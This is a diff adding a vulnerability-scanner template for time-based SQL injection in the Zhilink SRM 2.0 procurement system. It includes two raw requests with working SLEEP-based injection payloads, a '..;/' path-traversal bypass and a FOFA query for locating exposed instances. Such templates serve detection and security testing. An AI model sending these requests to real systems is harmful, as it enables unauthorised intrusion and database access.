@@ -1,0 +1,51 @@
+id: zhilink-srm-getSuppliers-or-statusList-sqli
+info:
+  name: 智联云仓 SRM 2.0 getSuppliers/statusList - sqli
+  author: leadlife
+  severity: high
+  description: 智互联(深圳)科技有限公司SRM智联云采系统statusList存在SQL注入漏洞，攻击者可以在易受攻击的系统上执行任意 SQL 语句。根据正在使用的后端数据库， SQL 注入漏洞会导致攻击者访问不同级别的数据/系统。不仅可以操作现有查询，还可以合并任意数据、使用子选择或追加附加查询。在某些情况下，可以读入或写出文件，或者在底层操作系统上执行 shell 命令。
+  reference: 
+    - todo
+  metadata:
+    verified: true
+    fofa-query: title=="SRM 2.0"
+  tags: srm,sqli,zhilink,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /adpweb/static/..;/a/sys/sysMessage/statusList?companyName=1&officeName=1&orderBy=1&receiverName=1&sourceMessageId=1&delStatus=1%20AND%20(SELECT%207104%20FROM%20(SELECT(SLEEP(3)))xZoa) HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+
+    matchers:
+      - type: dsl
+        name: statusList
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
+
+  - raw:
+      - |
+        @timeout: 15s
+        POST /adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=%27+AND+%28SELECT+1312+FROM+%28SELECT%28SLEEP%283%29%29%29HckV%29--+HyuV HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+
+    matchers:
+      - type: dsl
+        name: getSuppliers
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
